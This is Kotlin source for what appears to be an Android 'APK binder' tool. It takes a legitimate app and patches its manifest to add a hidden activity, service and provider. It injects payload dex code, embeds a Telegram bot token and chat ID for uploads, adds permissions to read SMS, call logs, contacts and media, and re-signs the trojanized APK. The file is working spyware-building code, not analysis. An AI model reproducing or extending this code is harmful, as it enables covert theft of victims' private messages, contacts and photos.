package Com.devhs.apkbinder.binder

import android.content.Context
import android.net.Uri
import androidx.documentfile.provider.DocumentFile
import com.android.apksig.ApkSigner
import Com.devhs.apkbinder.core.Const
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.PayloadConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.security.KeyStore
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

data class BindResult(
    val ok: Boolean,
    val message: String,
    val outputPath: String? = null
)

class BinderEngine(private val context: Context) {

    companion object {
        private const val ALIGN_SO = 16384
        private const val ALIGN_DEFAULT = 4
        private const val MANIFEST = "AndroidManifest.xml"
        private const val DEX_REGEX = "classes(\\d*)\\.dex"
    }

    suspend fun bind(
        source: Uri,
        activity: String,
        label: String,
        features: Set<Feature>,
        config: PayloadConfig,
        outDir: DocumentFile,
        onLog: (LogLevel, String) -> Unit
    ): BindResult = withContext(Dispatchers.IO) {

        val temps = ArrayList<File>()

        try {
            if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
            if (activity.isNotBlank()) onLog(LogLevel.INFO, "Activity: $activity")

            val src = resolveSource(source)
            if (src == null) {
                onLog(LogLevel.ERROR, "Source APK not readable")
                return@withContext BindResult(false, "Source not readable")
            }
            onLog(LogLevel.INFO, "Source APK: ${src.length() / 1024} KB")

            val pm = context.packageManager
            val info = pm.getPackageArchiveInfo(src.absolutePath, 0)
            if (info == null) {
                onLog(LogLevel.ERROR, "Source APK could not be parsed")
                return@withContext BindResult(false, "Parse failed")
            }

            val pkg = info.packageName
            onLog(LogLevel.INFO, "Package: $pkg")

            val permissions = buildPermissions(features, config.features)
            onLog(LogLevel.INFO, "Permissions to inject: ${permissions.size}")

            val authority = pkg + Const.AUTHORITY_SUFFIX
            onLog(LogLevel.INFO, "Authority: $authority")

            val payloadDexes = collectPayloadDexes()
            if (payloadDexes.isEmpty()) {
                onLog(LogLevel.ERROR, "Payload dex not found in own APK")
                return@withContext BindResult(false, "Payload dex missing")
            }
            val payloadKb = payloadDexes.sumOf { it.size } / 1024
            onLog(LogLevel.INFO, "Payload dexes: ${payloadDexes.size} (${payloadKb} KB)")

            val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
            temps.add(temp)

            var patched: ByteArray? = null

            ZipFile(src).use { zip ->

                val entry = zip.getEntry(MANIFEST)
                if (entry == null) {
                    onLog(LogLevel.ERROR, "$MANIFEST not found")
                    return@withContext BindResult(false, "Manifest missing")
                }

                val manifest = zip.getInputStream(entry).use { it.readBytes() }
                onLog(LogLevel.INFO, "Original manifest: ${manifest.size} bytes")

                patched = AxmlPatcher.patch(
                    manifest,
                    Const.PAYLOAD_ACTIVITY,
                    Const.PAYLOAD_SERVICE,
                    Const.PAYLOAD_PROVIDER,
                    authority,
                    permissions
                )

                val patchedBytes = patched
                if (patchedBytes == null) {
                    onLog(LogLevel.ERROR, "Manifest patch failed")
                    return@withContext BindResult(false, "Manifest patch failed")
                }
                onLog(LogLevel.INFO, "Patched manifest: ${patchedBytes.size} bytes")

                var slot = maxDexIndex(zip)
                onLog(LogLevel.INFO, "Host dex max index: $slot")

                FileOutputStream(temp).use { fos ->
                    CountingStream(fos).use { cs ->
                        ZipOutputStream(cs).use { zos ->

                            val entries = zip.entries()
                            while (entries.hasMoreElements()) {
                                val e = entries.nextElement()
                                val name = e.name

                                if (name == MANIFEST) continue
                                if (name == "assets/" + Const.CONFIG_ASSET) continue
                                if (isSignatureFile(name)) continue

                                val data = zip.getInputStream(e).use { it.readBytes() }
                                val stored = e.method == ZipEntry.STORED
                                writeEntry(zos, cs, name, data, stored)
                            }

                            writeEntry(zos, cs, MANIFEST, patchedBytes, false)

                            for (dex in payloadDexes) {
                                slot++
                                val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
                                writeEntry(zos, cs, dexName, dex, false)
                                onLog(LogLevel.INFO, "Injected $dexName (${dex.size / 1024} KB)")
                            }

                            if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
                                val json = "{\"bot_token\":\"${config.token}\",\"chat_id\":\"${config.chatId}\"}"
                                writeEntry(
                                    zos, cs, "assets/" + Const.CONFIG_ASSET,
                                    json.toByteArray(), false
                                )
                                onLog(LogLevel.INFO, "Config injected")
                            } else {
                                onLog(LogLevel.WARN, "Config missing - uploads will fail")
                            }
                        }
                    }
                }
            }

            onLog(LogLevel.INFO, "Signing...")
            val signed = File(context.cacheDir, "hs_${System.currentTimeMillis()}.signed.apk")
            temps.add(signed)

            try {
                sign(temp, signed, onLog)
            } catch (t: Throwable) {
                onLog(LogLevel.ERROR, "Sign failed: ${t.message}")
                return@withContext BindResult(false, "Sign failed: ${t.message}")
            }

            val check = pm.getPackageArchiveInfo(signed.absolutePath, 0)
            if (check == null) {
                onLog(LogLevel.ERROR, "Verification failed")
                return@withContext BindResult(false, "Verification failed")
            }

            onLog(LogLevel.INFO, "Verified: ${check.packageName}")
            onLog(LogLevel.INFO, "App class: ${check.applicationInfo?.className ?: "(none)"}")
            onLog(LogLevel.INFO, "Signed size: ${signed.length() / 1024} KB")

            if (!outDir.exists() || !outDir.isDirectory) {
                onLog(LogLevel.ERROR, "Output folder invalid")
                return@withContext BindResult(false, "Output folder invalid")
            }

            val outName = sanitize(label) + "_hs.apk"
            val doc = outDir.createFile("application/vnd.android.package-archive", outName)
            if (doc == null) {
                onLog(LogLevel.ERROR, "Cannot create output file")
                return@withContext BindResult(false, "Cannot create output file")
            }

            val out = context.contentResolver.openOutputStream(doc.uri)
            if (out == null) {
                onLog(LogLevel.ERROR, "Cannot write output file")
                return@withContext BindResult(false, "Cannot write output")
            }
            out.use { o ->
                signed.inputStream().use { i -> i.copyTo(o) }
            }

            onLog(LogLevel.SUCCESS, "Saved: $outName")
            BindResult(true, "Success", doc.uri.toString())

        } catch (t: Throwable) {
            onLog(LogLevel.ERROR, "${t.javaClass.simpleName}: ${t.message}")
            t.stackTrace.take(6).forEach { onLog(LogLevel.ERROR, "   at $it") }
            BindResult(false, t.message ?: "Unknown error")
        } finally {
            for (f in temps) {
                try {
                    if (f.exists()) f.delete()
                } catch (_: Throwable) {
                }
            }
        }
    }

    // ------------------------------------------------------------------
    // Payload dex from own APK
    // ------------------------------------------------------------------
    private fun collectPayloadDexes(): List<ByteArray> {
        val out = ArrayList<ByteArray>()
        try {
            val self = context.packageManager
                .getApplicationInfo(context.packageName, 0).sourceDir
            val rx = Regex(DEX_REGEX)
            ZipFile(self).use { z ->
                val entries = z.entries()
                while (entries.hasMoreElements()) {
                    val e = entries.nextElement()
                    if (!rx.matches(e.name)) continue
                    val bytes = z.getInputStream(e).use { it.readBytes() }
                    out.add(bytes)
                }
            }
        } catch (t: Throwable) {
            // ignore, caller checks empty
        }
        return out
    }

    private fun maxDexIndex(zip: ZipFile): Int {
        var max = 0
        val rx = Regex(DEX_REGEX)
        val entries = zip.entries()
        while (entries.hasMoreElements()) {
            val m = rx.matchEntire(entries.nextElement().name) ?: continue
            val n = m.groupValues[1].toIntOrNull() ?: 1
            if (n > max) max = n
        }
        return max
    }

    private fun resolveSource(uri: Uri): File? {
        try {
            if (uri.scheme == "file") {
                val path = uri.path
                if (path != null) {
                    val f = File(path)
                    if (f.exists()) return f
                }
                return null
            }
            val tmp = File(context.cacheDir, "src_${System.currentTimeMillis()}.apk")
            val input = context.contentResolver.openInputStream(uri)
            if (input == null) return null
            input.use { i ->
                tmp.outputStream().use { o -> i.copyTo(o) }
            }
            if (tmp.exists() && tmp.length() > 0) return tmp
            return null
        } catch (t: Throwable) {
            return null
        }
    }

    private fun sanitize(label: String): String {
        var base = label.ifBlank { "app" }
        base = base.replace(Regex("[^A-Za-z0-9._-]"), "_")
        base = base.take(40)
        return if (base.isBlank()) "app" else base
    }

    private fun buildPermissions(features: Set<Feature>, keys: List<String>): List<String> {
        val set = LinkedHashSet<String>()

        set += "android.permission.INTERNET"
        set += "android.permission.ACCESS_NETWORK_STATE"
        set += "android.permission.POST_NOTIFICATIONS"
        set += "android.permission.WAKE_LOCK"
        set += "android.permission.RECEIVE_BOOT_COMPLETED"
        set += "android.permission.FOREGROUND_SERVICE"
        set += "android.permission.FOREGROUND_SERVICE_DATA_SYNC"

        val all = ArrayList<String>()
        for (f in features) {
            all.add(f.key.lowercase())
            all.add(f.name.lowercase())
        }
        for (k in keys) all.add(k.lowercase())

        if (all.any { it.contains("gallery") || it.contains("image") || it.contains("photo") }) {
            set += "android.permission.READ_EXTERNAL_STORAGE"
            set += "android.permission.READ_MEDIA_IMAGES"
            set += "android.permission.READ_MEDIA_VIDEO"
        }
        if (all.any { it.contains("sms") }) {
            set += "android.permission.READ_SMS"
            set += "android.permission.RECEIVE_SMS"
        }
        if (all.any { it.contains("call") }) {
            set += "android.permission.READ_CALL_LOG"
            set += "android.permission.READ_PHONE_STATE"
        }
        if (all.any { it.contains("contact") }) {
            set += "android.permission.READ_CONTACTS"
        }
        if (all.any { it.contains("device") || it.contains("info") }) {
            set += "android.permission.READ_PHONE_STATE"
        }

        return set.toList()
    }

    private fun isSignatureFile(name: String): Boolean {
        if (!name.startsWith("META-INF/")) return false
        val upper = name.uppercase()
        return upper.endsWith(".RSA") || upper.endsWith(".DSA") ||
                upper.endsWith(".EC") || upper.endsWith(".SF") || upper.endsWith(".MF")
    }

    private fun writeEntry(
        zos: ZipOutputStream,
        cs: CountingStream,
        name: String,
        data: ByteArray,
        stored: Boolean
    ) {
        val e = ZipEntry(name)

        if (stored) {
            val crc = CRC32()
            crc.update(data)
            e.method = ZipEntry.STORED
            e.size = data.size.toLong()
            e.compressedSize = data.size.toLong()
            e.crc = crc.value
        } else {
            e.method = ZipEntry.DEFLATED
        }

        zos.putNextEntry(e)
        zos.write(data)
        zos.closeEntry()
        zos.flush()

        val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
        val pad = paddingFor(cs.count, align)
        if (pad > 0) {
            cs.write(ByteArray(pad))
            cs.flush()
        }
    }

    private fun paddingFor(position: Long, align: Int): Int {
        val rem = (position % align).toInt()
        return if (rem == 0) 0 else align - rem
    }

    private class CountingStream(private val out: OutputStream) : OutputStream() {
        var count: Long = 0L
            private set

        override fun write(b: Int) {
            out.write(b)
            count++
        }

        override fun write(b: ByteArray, off: Int, len: Int) {
            out.write(b, off, len)
            count += len
        }

        override fun flush() = out.flush()
        override fun close() = out.flush()
    }

    private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
        val ks = KeyStore.getInstance("JKS")
        context.assets.open(Const.KEYSTORE_ASSET).use {
            ks.load(it, Const.KS_PASS.toCharArray())
        }

        val alias = if (ks.containsAlias(Const.KS_ALIAS)) Const.KS_ALIAS
        else ks.aliases().nextElement()

        val key = ks.getKey(alias, Const.KS_PASS.toCharArray()) as PrivateKey
        val cert = ks.getCertificate(alias) as X509Certificate

        val signer = ApkSigner.SignerConfig.Builder(alias, key, listOf(cert)).build()

        ApkSigner.Builder(listOf(signer))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .build()
            .sign()

        onLog(LogLevel.INFO, "Signed: ${output.length() / 1024} KB")
    }
}
